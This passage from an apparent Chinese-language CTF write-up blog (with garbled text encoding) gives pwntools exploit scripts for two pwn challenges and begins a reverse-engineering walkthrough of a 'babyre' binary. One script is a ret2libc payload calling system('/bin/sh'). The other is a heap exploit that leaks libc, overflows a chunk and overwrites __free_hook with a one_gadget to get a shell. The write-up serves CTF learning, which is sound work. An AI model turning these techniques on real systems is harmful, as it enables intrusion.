class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;So?How are you?\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;g01den\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    io.recvuntil(<span class="string">b&quot;plz input the count of your advice\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">    payload2 = (offset -<span class="number">8</span>) * <span class="string">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret)</span><br><span class="line">    payload2 += p32(system_addr) + p32(binsh_addr) + p32(binsh_addr) + p32(binsh_addr)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œ payload2 çš„ <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  æœ‰ç‚¹å„¿é—®é¢˜ï¼Œä¸æ˜¯æˆ‘çš„ exp çš„é—®é¢˜ï¼Œæ˜¯æˆ‘æœ€å¼€å§‹æœ¬åœ°è°ƒé¢˜ç›®çš„æ—¶å€™å‡ºç°çš„é—®é¢˜ï¼Œæˆ‘å‘ç°å®ƒè¿™é‡Œå¦‚æœä¸æ³„éœ²è¿™ä¸ªåœ°å€çš„è¯å°±æ‰“ä¸é€šï¼Œä½†ä¸ºå•¥ç°åœ¨ä¸éœ€è¦è¿™ä¸ªéƒ½èƒ½å‡ºï¼Œæœ‰ç‚¹è¿‡äºéšç¼˜äº†ï¼Œå¦‚æœä¸åŠ ä¸Šè¿™ä¸ªåœ°å€ä¸é€šçš„è¯ï¼Œ é‚£å°±è€ƒè™‘ gdb è°ƒä¸€ä¸‹çœ‹çœ‹æ˜¯å¦è¿™é‡Œç¼ºå¤±äº†ä»€ä¹ˆï¼Œæˆ–è€…å¯„å­˜å™¨ä¹‹ç±»çš„é—®é¢˜ï¼ˆè¡¥å……ï¼Œè¿™é‡Œå‡ºç°é—®é¢˜æ˜¯å› ä¸ºå† call puts çš„ plt çš„æ—¶å€™ï¼Œå‡ºç°äº†é—®é¢˜ï¼Œæœ‰ä¸ªå­˜åœ¨ ebp-4 çš„åœ°å€ç»™ mov åˆ°äº† ebx å¯„å­˜å™¨ä¸­ï¼ŒåŒæ—¶ï¼Œå­˜åœ¨ jmp ebp+XX ç›¸å…³ä»£ç ï¼ŒåŠ¨è°ƒçš„æ—¶å€™ï¼Œå‘ç°æŠ¥é”™åœ°å€æ˜¯ aaaaï¼Œæ‰€ä»¥æ”¹æˆ <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  å°±èƒ½æ‰“é€šï¼‰ã€‚</p><h3 id="arcaea_sorting_revenge"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge">#</a> Arcaea_Sorting_Revengeï¼š</h3><p>â€‹ä¼¼ä¹å‡ºäº†ä¸ªæ¿å­é¢˜ï¼Œä¸è¿‡ï¼Œæˆ‘ä¹Ÿç®—æ˜¯å°½åŠ›äº†å§ï¼Œå †è¿™ç©æ„å„¿æ˜¯çœŸçš„éš¾ã€‚</p><p>â€‹ç¨‹åºåšäº†ä¸ªç®€å•çš„å­˜å‚¨åŠŸèƒ½ï¼Œarcaea å­˜å‚¨åˆ†æ•°å¹¶è¾“å‡ºçš„åŠŸèƒ½ï¼Œåˆ é™¤åŠŸèƒ½é‡Œä¼šå°† bss æ®µé‡Œçš„å½“å‰æŒ‡é’ˆç½®é›¶ï¼Œä½†æ˜¯æ­Œæ›²ä¿¡æ¯é‚£ä¸ª chunk é‡Œé¢ï¼ŒæŒ‡å‘ description çš„æŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œedit ä¿®æ”¹äº†è¾“å…¥çš„é•¿åº¦ï¼Œä½†æ˜¯æ²¡æœ‰é‡æ–° malloc æ–°çš„ç©ºé—´ï¼Œæ²¡æœ‰æ£€æµ‹å¤§å°ï¼Œå­˜åœ¨å †æº¢å‡ºï¼Œå¢åŠ åŠŸèƒ½é‡Œä¸€æ¬¡ malloc äº†ä¸¤æ¬¡ chunkï¼Œç¬¬äºŒæ¬¡å¯ä»¥æ§åˆ¶å¤§å°ã€‚</p><p>â€‹é¦–å…ˆå¢åŠ ä¸‰æ¬¡ä¹¦ï¼Œæ¯æ¬¡éƒ½æ˜¯ï¼Œæ§åˆ¶ size å¤§å°ä¸º 0x91ï¼Œä¿è¯ chunk åœ¨è¢« free çš„æ—¶å€™èƒ½è¿› unsortedbinï¼Œfree æ‰ç¼–å·ä¸º 1 çš„è¿™ä¸ªéŸ³ä¹ï¼Œç„¶åé‡æ–°å»ºä¸€ä¸ªæ­Œæ›²ï¼Œä¸ºäº†è®© chunk é‡Œæœ‰ unsortedbin é‡Œçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ fd æˆ–è€… bk æŒ‡é’ˆï¼Œå› ä¸º unsortedbin ç›®å‰åªæœ‰ä¸€ä¸ª chunkï¼Œæ‰€ä»¥ fdï¼Œbk æŒ‡é’ˆå‡æŒ‡å‘ main_arenaï¼Œå¯ä»¥ç”¨æ¥ leak æ‰ libc åœ°å€ï¼Œé‡æ–° add äº†ä¸€ä¸ªä¹‹åï¼Œç¼–å·ä¾æ—§ä¸º 1ï¼Œç„¶åå†™å…¥çš„ content ä¸ºå…«ä¸ªå­—èŠ‚ï¼Œä¸è¦å†™å…¥å…¶ä»–å†…å®¹ï¼Œä¹‹å show å¯ä»¥ leak å‡º libc åœ°å€ï¼Œä¹‹åä¸ºäº† leak å †çš„åœ°å€ï¼Œæˆ‘ free äº†ä¸¤æ¬¡ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶ä¸éœ€è¦è¿™ä¹ˆåšï¼Œä¹‹åå°±æ˜¯åˆ©ç”¨ edit çš„æº¢å‡ºåŠŸèƒ½ï¼Œåœ¨å †ä¸Šä¿®æ”¹ chunkï¼Œè¾¾æˆä¼ªé€ ï¼Œä¼ªé€ æŒ‡é’ˆï¼ŒæŒ‡å‘ä»»æ„åœ°å€ï¼Œè¿™é‡ŒæŒ‡å‘ <code>__free_hook</code> ï¼Œç„¶å edit ä¿®æ”¹ <code>__free_hook</code>  ä¸º <code>one_gadget</code>  çš„åœ°å€ï¼Œç„¶åè¿›è¡Œ getshellã€‚</p><p>â€‹ç®—æ˜¯ä¸ªæ¯”è¾ƒæ¿å­çš„å †é¢˜å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;154.64.254.169&quot;,33215)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,rating,score,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,name)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(rating))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,descSize,desc</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input max size you want to change to:&quot;</span>,<span class="built_in">str</span>(descSize))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input description:&quot;</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;plz enter your username:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;g01den&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;testify&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;hardhard&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;bbbb&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;what&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;cccc&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;nani&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking libc address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;dddddddd&quot;</span>)</span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[:-6].ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line"><span class="comment"># main_arena = u64(io.recvuntil(b&quot;\x7f&quot;).ljust(8,b&quot;\x00&quot;))</span></span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;main_arena =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(main_arena)))</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;eeee&quot;</span>,<span class="number">12</span>,<span class="number">10002221</span>,<span class="number">128</span>,<span class="string">b&quot;eeeeeeee&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;######################leaking chunk6 address########################3&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s name:&quot;</span>,<span class="string">b&quot;ffff&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input music&#x27;s score:&quot;</span>,<span class="built_in">str</span>(<span class="number">10002221</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class="built_in">str</span>(<span class="number">128</span>))</span><br><span class="line">io.sendafter(<span class="string">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;ffffffff&quot;</span>)</span><br><span class="line">chunk = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">chunk_basee = chunk - <span class="number">0x210</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk))</span><br><span class="line">log.success(<span class="string">&quot;chunk_basee =&gt; &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(chunk_basee)))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">target_chunk = chunk_basee + <span class="number">0x210</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x51</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x30</span> + p64(<span class="number">1</span>) + p64(<span class="number">10002221</span>) + p64(free_hook)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x100</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>æ³¨ï¼šåˆ«é—®ä¸ºå•¥æ²¡æœ‰å‰©ä¸‹ä¸¤ä¸ª pwn é¢˜çš„ wpï¼Œå› ä¸ºæˆ‘ä¹Ÿä¸ä¼šï¼Œå¹¶ä¸”çŸ­æ—¶é—´å†…å­¦ä¸ä¼š</strong></p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h2><h3 id="babyre"><a class="markdownIt-Anchor" href="#babyre">#</a> babyreï¼š</h3><p>â€‹æ— å£³ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(main, v4, &amp;retaddr, <span class="number">0LL</span>, <span class="number">0LL</span>, a3, &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ˜¯ Linux ç¼–è¯‘çš„ï¼Œè¿› main é‡Œçœ‹çœ‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE v6[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">40</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v6, a2, a3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v7, a2, v3);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v8, a2, v4);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_21AD);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;std::cin, v6);</span><br><span class="line">  <span class="built_in">sub_147E</span>();</span><br><span class="line">  <span class="built_in">sub_1558</span>();</span><br><span class="line">  <span class="built_in">sub_13A9</span>(v8, v6);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(v7, v6);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v6);</span><br><span class="line">  <span class="built_in">sub_1920</span>(v9, v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(v9, v7);</span><br><span class="line">  <span class="built_in">sub_17A7</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v8);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹C++ é€†å‘ï¼Œä»£ç ä¸å¤æ‚ï¼ŒShift+F12 æ‰¾å…³é”®å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000021BF aWrongValue     db &#x27;Wrong Value&#x27;,0      ; DATA XREF: sub_17A7+110â†‘o</span><br><span class="line">.rodata:00000000000021CB aCurruntValue   db &#x27;Currunt Value&#x27;,0    ; DATA XREF: sub_17A7+149â†‘o</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¸ªä¸€ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°è°ƒç”¨äº†ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_17A7</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1B0h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1ACh]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  _DWORD v6[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = std::string::<span class="built_in">length</span>(a1);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x190</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    v6[i] = *(<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](a1, i) ^ (i / <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6[j] != dword_4020[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="number">1</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong Value&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Currunt Value&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæœ‰ä¸ªå¼‚æˆ–è¿ç®—ï¼Œé€ä¸ªæ¯”è¾ƒï¼Œæ¨æµ‹è¿™é‡Œå°±æ˜¯ç›®çš„å‡½æ•°ï¼Œè¿”å› main å‡½æ•°ï¼Œä¼ å‚æ˜¯ v9ï¼Œç›¯ç€ v9ï¼Œä»ä¸‹å¾€ä¸Šçœ‹ï¼Œæ‰¾åˆ°é—¨è·¯ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_1920</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+18h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-94h]</span></span><br><span class="line">  _WORD *v9; <span class="comment">// [rsp+20h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-88h]</span></span><br><span class="line">  _BYTE v11[<span class="number">44</span>]; <span class="comment">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+5Ch] [rbp-54h]</span></span><br><span class="line">  _QWORD v13[<span class="number">6</span>]; <span class="comment">// 